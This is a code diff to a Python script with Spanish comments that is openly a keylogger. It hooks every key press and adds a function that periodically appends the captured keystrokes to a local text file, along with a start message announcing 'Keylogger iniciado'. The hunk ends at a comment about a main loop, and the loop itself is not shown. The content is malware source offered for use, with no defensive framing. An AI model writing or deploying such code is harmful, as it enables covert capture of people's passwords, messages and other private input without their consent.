@@ -24,3 +24,12 @@ def registrar_tecla(tecla):
 # Asociamos la función al evento de presionar tecla
 keyboard.on_press(registrar_tecla)
 
+# Guardar cada cierto tiempo (por ejemplo, cada 10 segundos)
+def guardar_en_archivo():
+    with open("registro_teclas.txt", "a", encoding="utf-8") as f:
+        f.write("".join(teclas_presionadas))
+    teclas_presionadas.clear()
+
+# Bucle principal: guarda el contenido cada 10 segundos
+print("Keylogger iniciado... (Ctrl+C para salir)")
+
